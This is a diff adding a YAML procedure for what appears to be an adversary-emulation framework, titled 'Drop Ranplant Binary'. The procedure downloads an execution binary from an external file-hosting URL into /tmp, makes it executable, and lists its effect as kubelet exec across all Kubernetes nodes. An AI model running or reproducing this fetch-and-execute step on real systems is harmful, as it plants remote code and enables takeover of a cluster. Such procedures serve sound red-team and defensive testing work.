@@ -1,0 +1,23 @@
+name: Drop Ranplant Binary
+description: Downloads the Ranplant target-side execution binary to a system
+tactic: Execution
+techniques: ["User Execution"]
+parameters:
+  URL:
+    type: string
+    default: https://filedn.eu/lInD0fhKjA3uc70xrPjtNUj/ranplant-linux-amd64
+    description: URL of the Ranplant Linux amd64 binary; override it for other target architectures
+procedures:
+  - key: http-request
+    steps:
+      - fetch:
+          url: ${URL}
+          to: /tmp/ranplant
+          follow_redirects: true
+      - chmod: +x /tmp/ranplant
+preconditions:
+  kind: System
+  accessLevel: user-exec
+effects:
+  - "sys.has-binary(ranplant, /tmp/ranplant)"
+  - "k8s.kubelet-exec(sys, all(k8s.Node))"
